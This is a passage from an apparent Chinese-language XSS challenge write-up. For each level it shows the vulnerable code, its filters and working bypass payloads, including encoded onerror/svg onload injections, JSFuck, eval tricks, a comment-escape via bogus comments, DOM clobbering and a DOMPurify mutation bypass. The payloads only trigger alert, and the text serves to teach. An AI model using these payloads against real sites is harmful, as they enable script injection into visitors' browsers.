class="line">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot; action=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ah-thats-hawt"><a class="markdownIt-Anchor" href="#ah-thats-hawt">#</a> Ah That’s Hawt</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;will&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &quot;Ah That&#x27;s Hawt&quot;)</span><br><span class="line">    smith = smith.replace(/[\(\`\)\\]/g, &#x27;&#x27;)</span><br><span class="line">    will.innerHTML = smith</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">过滤了()`\  </span><br><span class="line">先html实体，在url编码</span><br><span class="line">或者两次url编码</span><br><span class="line">payload:</span><br><span class="line">markassbrownlee=&lt;img%20src=1%20onerror=alert%26%2340%3B1%26%2341%3B&gt;</span><br><span class="line">markassbrownlee=&lt;a href=&quot;javascript:alert%25281%2529&quot;&gt;a </span><br><span class="line">markassbrownlee=%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E  //两次编码svg中的alert1</span><br><span class="line">href中js可以解析url编码,%28 %29</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ligma"><a class="markdownIt-Anchor" href="#ligma">#</a> Ligma</h2>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5qc2Z1Y2suY29tLw==">http://www.jsfuck.com/</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">balls = (new URL(location).searchParams.get(&#x27;balls&#x27;) || &quot;Ninja has Ligma&quot;)</span><br><span class="line">balls = balls.replace(/[A-Za-z0-9]/g, &#x27;&#x27;)</span><br><span class="line">eval(balls)</span><br><span class="line">jsfuck 注意编码，url中需要使用URL编码</span><br><span class="line"></span><br><span class="line">false       =&gt;  ![]</span><br><span class="line">true        =&gt;  !![]</span><br><span class="line">undefined   =&gt;  [][[]]</span><br><span class="line">NaN         =&gt;  +[![]]</span><br><span class="line">0           =&gt;  +[]</span><br><span class="line">1           =&gt;  +!+[]</span><br><span class="line">2           =&gt;  !+[]+!+[]</span><br><span class="line">10          =&gt;  [+!+[]]+[+[]]</span><br><span class="line">Array       =&gt;  []</span><br><span class="line">Number      =&gt;  +[]</span><br><span class="line">String      =&gt;  []+[]</span><br><span class="line">Boolean     =&gt;  ![]</span><br><span class="line">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="mafia"><a class="markdownIt-Anchor" href="#mafia">#</a> mafia</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mafia = (new URL(location).searchParams.get(&#x27;mafia&#x27;) || &#x27;1+1&#x27;)</span><br><span class="line">mafia = mafia.slice(0, 50)</span><br><span class="line">mafia = mafia.replace(/[\`\&#x27;\&quot;\+\-\!\\\[\]]/gi, &#x27;_&#x27;)</span><br><span class="line">mafia = mafia.replace(/alert/g, &#x27;_&#x27;)</span><br><span class="line">eval(mafia)</span><br><span class="line"></span><br><span class="line">payload1:</span><br><span class="line">eval(17795081..toString(36))(1)</span><br><span class="line">原理：</span><br><span class="line">17795081是parseInt(&quot;alert&quot;, 36);的结果，即先把alert转为进制数，在使用..toString转回来</span><br><span class="line">parseInt(&quot;&quot;, ); 解析一个字符串并返回指定基数的十进制整数， radix 是2-36之间的整数，表示被解析字符串的基数。</span><br><span class="line">36 = 10 + 26    10个数字+26个字母</span><br><span class="line">alert中最大的是t，进制数为30，因此必须使用&gt;=30的进制数才能表示t</span><br><span class="line">转换时使用thatNumber.toString(radix)函数。</span><br><span class="line">前一篇prompt(1)详细解释过了</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">eval(location.hash.slice(1))</span><br><span class="line">eval(location.hash.slice(1))#alert(1)</span><br><span class="line">但这种方式需要user interaction</span><br><span class="line">原理：</span><br><span class="line">url.href = &#x27;https://developer.mozilla.org/en-US/search?q=URL#search-results-close-container&#x27;;</span><br><span class="line">console.log(url.hash);      // #search-results-close-container</span><br><span class="line"></span><br><span class="line">payload3：</span><br><span class="line">Function(/ALERT(1337)/.source.toLowerCase())()</span><br><span class="line">利用构造函数</span><br></pre></td></tr></table></figure>
<h2 id="area-51"><a class="markdownIt-Anchor" href="#area-51">#</a> Area 51</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;pwnme&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\!\-\/\#\&amp;\;\%]/g, &#x27;_&#x27;);</span><br><span class="line">    var template = document.createElement(&#x27;template&#x27;);</span><br><span class="line">    template.innerHTML = input;</span><br><span class="line">    pwnme.innerHTML = &quot;&lt;!-- &lt;p&gt; DEBUG: &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">分析：过滤 !-/#&amp;;% 全部被替换为_</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">&lt;?&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;?&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;?&gt;&lt;a href=javascript:alert(1)&gt;aaa</span><br><span class="line">只要能闭合注释，后面的基本除了script标签之外可以乱写</span><br><span class="line">    </span><br><span class="line">如果直接闭合，--会被替换，&gt;会被innerhtml转义</span><br><span class="line">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;__&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- --&gt;是多行注释，换行也不行，换行效果： ?debug=%0a&lt;svg/onload=alert(1)&gt;</span><br><span class="line">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;</span><br><span class="line">&lt;svg_onload=alert(1)&gt;&lt;/svg_onload=alert(1)&gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class="line">    </span><br><span class="line">但如果输入&lt;?&gt;  ?debug=&lt;?&gt;aaaaaaaaaaa</span><br><span class="line">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;!--?--&gt;</span><br><span class="line">aaaaaaaaaaa</span><br><span class="line">&lt;p&gt;&lt;/p&gt; </span><br><span class="line">--&amp;gt;</span><br><span class="line">注释被闭合了，注释后面输入的内容可以逃逸出来</span><br><span class="line">    </span><br><span class="line">在template.innerHTML = input的时候，会解析input，然后使用 HTML parser 解析，根据 W3 文档</span><br><span class="line">解析到&lt;的时候，HTML parser 正处于 [data state]</span><br><span class="line">下一个字符是?，根据文档，HTML parser 会创建一个空的 comment token，进入 [bogus comment state]</span><br><span class="line">下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的&lt;!--?--&gt; </span><br><span class="line">例如输入是aaa&lt;?bbb&gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的</span><br><span class="line">a</span><br><span class="line">aa</span><br><span class="line">aaa</span><br><span class="line">aaa&lt;</span><br><span class="line">aaa&lt;!--?--&gt;</span><br><span class="line">aaa&lt;!--?b--&gt;</span><br><span class="line">aaa&lt;!--?bb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;c</span><br><span class="line">aaa&lt;!--?bbb--&gt;cc</span><br><span class="line">aaa&lt;!--?bbb--&gt;ccc</span><br><span class="line">直到该状态遇到了&gt;为止，回到 data state。注意这个 Bogus comment state 解析到&gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</span><br><span class="line"></span><br><span class="line">我们输入payload后：?debug=aaa&lt;?bbb&gt;ccc&lt;svg%20onload=alert(1)&gt;</span><br><span class="line">首先aaa&lt;?bbb&gt;ccc 变为 aaa&lt;!--?bbb--&gt; ccc</span><br><span class="line">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;aaa&lt;!--?bbb--&gt;</span><br><span class="line">&quot;ccc&quot;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class="line">成功闭合注释</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">如果题目没有过滤&amp;#时，存在unintended solution</span><br><span class="line">payload:</span><br><span class="line">&lt;img title=&quot;&amp;#x2D;&amp;#x2D;&amp;#x3E;&amp;#x3C;&amp;#x73;&amp;#x76;&amp;#x67;&amp;#x2F;&amp;#x6F;&amp;#x6E;&amp;#x6C;&amp;#x6F;&amp;#x61;&amp;#x64;&amp;#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;1&amp;#x29;&amp;#x3E;&quot;&gt;1</span><br><span class="line"></span><br><span class="line">我们可以用html实体编码闭合多行注释</span><br><span class="line">但：简单的--&gt;; 并不能闭合,因为第一次的innerHTML会将&gt;进行编码为实体，第二次innerhtml时传入的是--&amp;gt;不能闭合</span><br><span class="line">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class="line">但img标签中title可以绕过，因为第一次HTML parser不会将 title 属性内的字符串进行转义</span><br><span class="line">&lt;svg&gt;&lt;b title=&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;&gt;aaa</span><br><span class="line">最终在html中渲染的是</span><br><span class="line">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;--&gt;&lt;svg onload=&quot;alert()&quot;&gt;&quot;&amp;gt;1 &lt;/svg&gt;&lt;p&gt;&lt;/p&gt; --&amp;gt;</span><br><span class="line">然后当 HTML parser 解析这段代码时，首先由&lt;!的存在，会进入[Markup declaration open state]，中间的代码&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=”会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的–&gt;让 HTML parser 进入到了[Comment End State]</span><br></pre></td></tr></table></figure>
<h2 id="okboomer"><a class="markdownIt-Anchor" href="#okboomer">#</a> OK，Boomer</h2>
<p><strong>前置知识：</strong></p>
<p>1.DOM 中内容会影响 Windows</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="variable language_">window</span>.<span class="property">btn</span>)  <span class="comment">//&lt;button id=&quot;btn&quot;&gt;click me&lt;/button&gt;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>只需要用 id 同名就可以拿到 html 元素</p>
<p>也就是说除了  <code>id</code>  可以直接用  <code>window</code>  存取， <code>embed</code> ,  <code>form</code> ,  <code>img</code>  和  <code>object</code>  这四个标签用  <code>name</code>  也可以操作：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;b&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">&quot;c&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">name</span>=<span class="string">&quot;d&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="variable language_">window</span>.<span class="property">c</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过 html 影响 js</p>
<p>1) 利用 html 标签的属性 id，很容易在 window 对象上创建任意的属性，但是我们能在新对象上创建新属性吗？</p>
<p>2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 [object HTMLInputElement]。</p>
<p>关于问题 1)</p>
<p>最常引用的解决方法是使用 <code>&lt;form&gt;</code>  标签。标记的每个 <code>&lt;input&gt;</code>  都属于 <code>&lt;form&gt;</code>  后代，该属性 <code>&lt;form&gt;</code>  引用 <code>name</code>  属性可以取到 <code>&lt;input&gt;</code> 。考虑以下示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=test1&gt;</span><br><span class="line">  &lt;input name=test2&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  alert(test1.test2); // alerts &quot;[object HTMLInputElement]&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>可以通过 name 取值，但取到的值是对象，即引出问题 2)</p>
<p>js 内部会执行两个方法 tovalue,tostring，因为 js 的原型链</p>
<p>一般来说，对象的 <code>valueof</code>  方法总是返回对象自身，这时再自动调用对象的 <code>tostring</code>  方法，将其转为字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123; p: 1 &#125;;</span><br><span class="line">obj.valueof().tostring() // &quot;[object object]&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对象的 <code>tostring</code>  方法默认返回 <code>[object object]</code> ，所以就得到了最前面那个例子的结果。</p>
<p>通过遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义</p>
<p>一个简短的 JS 代码，它遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义。如果它们不继承自 <code>Object.prototype</code> ，那么可能 <code>[object SomeElement]</code>  会返回其他东西。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object.getOwnPropertyNames(window)   //获取Window下object所有属性</span><br><span class="line">.filter(p =&gt; p.match(/Element$/))   //匹配以element结尾的属性</span><br><span class="line">.map(p =&gt; window[p])</span><br><span class="line">.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString)  //找到不继承object的tostring的元素</span><br></pre></td></tr></table></figure>
<p>得到结果 <code>HTMLAreaElement</code> （ <code>&lt;area&gt;</code> ）和 <code>HTMLAnchorElement</code> （ <code>&lt;a&gt;</code> ）这两个元素不继承 tostring 方法</p>
<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=test1 href=https://securitum.com&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  alert(test1); // alerts &quot;https://securitum.com&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>由于没有继承 tostring 导致弹出的不再是 object htmlinputelement，a 标签可以控制弹出的内容</p>
<p>但是以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.test1.test2) &#123;</span><br><span class="line">    eval(&#x27;&#x27;+window.test1.test2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果为 undefined</p>
<p>假设有两个 id 一样的元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class="line">&lt;a id=test1&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>通过 id 取值，得到 htmlcollection，htmlcollection 可以通过索引取值， <code>window.test1.test1</code>  实际上是指第一个元素，但无法取到第二个元素</p>
<p>如果想取到第二个元素，需要给第二个元素加 name 值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class="line">&lt;a id=test1 name=test2&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以通过 name 访问第二个 a <code>window.test1.test2</code></p>
<p>通过给第二个 a 加 href 控制弹出内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;test1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;test1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test2&quot;</span> <span class="attr">href</span>=<span class="string">&quot;x:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但 x 不是标准协议，需要使用协议比如 <code>tel,mailto,cid,javascript</code>  等</p>
<p>即：需要有两个 a 标签，且需要通过 name 去到第二个 a 标签</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM3MTA2MTUwNzQtNzAwNGY1NGUtM2YyMy00NTc0LWJhYWYtMTk0MTI3MzEyZjIwLm1k">📎Ok, Boomer.md</span></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;boomer&quot;</span>&gt;</span>Ok, Boomer.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    boomer.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(location).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;boomer&#x27;</span>) || <span class="string">&quot;Ok, Boomer&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(ok, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>setTimeout (ok, 2000) 中的 ok 可以接收一个函数或者字符串，如果我们能够向 ok 这个变量注入可执行的 payload，那么也就能成功弹框</p>
<p>可以使用 DOM Clobbering 的方式，通过向 HTML 注入 DOM 元素，来实现操作 JavaScript 变量</p>
<p>首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如<div id="ok"></div></p>
<p>然后，ok 需要接受一个字符串作为值，而在对<a>标签调用 toString () 方法时，会返回属性 href 的值，所以，我们可以选择<a>标签作为构造对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?boomer=&lt;a id=ok href=cid:alert(1337)&gt;</span><br></pre></td></tr></table></figure>
<p>href 的值要遵守 protocol:uri 的格式，然而，在 href 里直接使用 javascript: 协议是不行的</p>
<p>通过查看 DOMPurify 的源码可以发现，它支持的合法的协议 有 mailto, tel, xmpp 等等，随便选择一个即可</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?boomer=&lt;a%20id=ok%20href=mailto:alert(1337)&gt;</span><br><span class="line">?boomer=&lt;a%20id=ok%20href=tel:alert(1337)&gt;</span><br></pre></td></tr></table></figure>
<p>由于劫持了 settimeout，因此会延迟两秒执行</p>
<p>通过两个 id 可以取到的标签：</p>
<p>form,button</p>
<p>form,fieldset</p>
<p>form,image</p>
<p>form,img</p>
<p>form,input</p>
<p>form,object</p>
<p>form,output</p>
<p>form,select</p>
<p>form,textarea</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=x&gt;</span><br><span class="line">	&lt;img id=y&gt;</span><br><span class="line">console.log(x.y)  //&lt;img id=y&gt;</span><br></pre></td></tr></table></figure>
<p>通过三层嵌套取到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=x&gt;</span><br><span class="line">&lt;form id=x name=y&gt;</span><br><span class="line">&lt;input id=z&gt;</span><br><span class="line"></span><br><span class="line">window.x.y.z.value</span><br></pre></td></tr></table></figure>
<p>unintended solution</p>
<p>利用 html-svg-math 的命名空间混淆突变绕过 dompurify，要求 dompurify 版本 &lt; 2.0.7</p>
<p>前置知识：</p>
<p>1.DOMPurify 的典型用法使 HTML 标记被解析两次。</p>
<p>dompurify 使用语句如下</p>
<p><code>div.innerHTML = DOMPurify.sanitize(htmlMarkup)</code></p>
<p>在解析和序列化 HTML 以及对 DOM 树的操作方面，在上面的简短片段中发生了以下操作：</p>
<ol>
<li><code>htmlMarkup</code>  <strong>被解析为 DOM 树</strong>。</li>
<li>DOMPurify 清理 DOM 树（简而言之，该过程是遍历 DOM 树中的所有元素和属性，并删除所有不在允许列表中的节点）。</li>
<li>DOM 树<strong>被序列化回 HTML 标记</strong>。</li>
<li>分配给 后 <code>innerHTML</code> ，浏览器会<strong>再次解析 HTML 标记</strong>。</li>
<li>解析后的 DOM 树被附加到文档的 DOM 树中。</li>
</ol>
<p>假设我们的初始 html 是 <code>A&lt;img src=1 onerror=alert(1)&gt;B</code> 。在第一步中，它被解析为以下树：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-1-1536x155.png" alt=""></p>
<p>然后，DOMPurify 对其进行清理，留下以下 DOM 树：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-2-1536x161.png" alt=""></p>
<p>然后它被序列化为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A&lt;img src=&quot;1&quot;&gt;B</span><br></pre></td></tr></table></figure>
<p>这就是 <code>DOMPurify.sanitize</code>  的返回值。然后浏览器在分配给 innerHTML 时再次解析：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1536x161.png" alt=""></p>
<p>DOM 树与 DOMPurify 处理的树相同，然后附加到文档中。</p>
<p>所以附加到文档之前需要解析 - 序列化 - 解析。但<strong>两次解析的 DOM 树未必相同</strong>。</p>
<p>2.HTML 规范有一个问题，它使得创建嵌套 <code>form</code>  元素成为可能。但是，在重新解析时，第二个 <code>form</code>  将消失。</p>
<p>html 规范中，不允许 form 元素的子元素是 form。那么说明嵌套 form 元素是不被允许的。这会导致嵌套里面的 form 元素被 html 解析器忽略。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=form1&gt;</span><br><span class="line">INSIDE_FORM1</span><br><span class="line">&lt;form id=form2&gt;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-5-1536x121.png" alt=""></p>
<p>我们可以通过带有错误嵌套标签的稍微损坏的标记，可以创建嵌套表单。</p>
<p><code>&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;/form&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;</code></p>
<p>它产生以下 DOM 树，其中包含一个嵌套的表单元素：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-6-1536x211.png" alt=""></p>
<p>这不是任何特定浏览器中的错误；它直接来自 HTML 规范，并在解析 HTML 的算法中进行了描述。这是一般的想法：</p>
<ul>
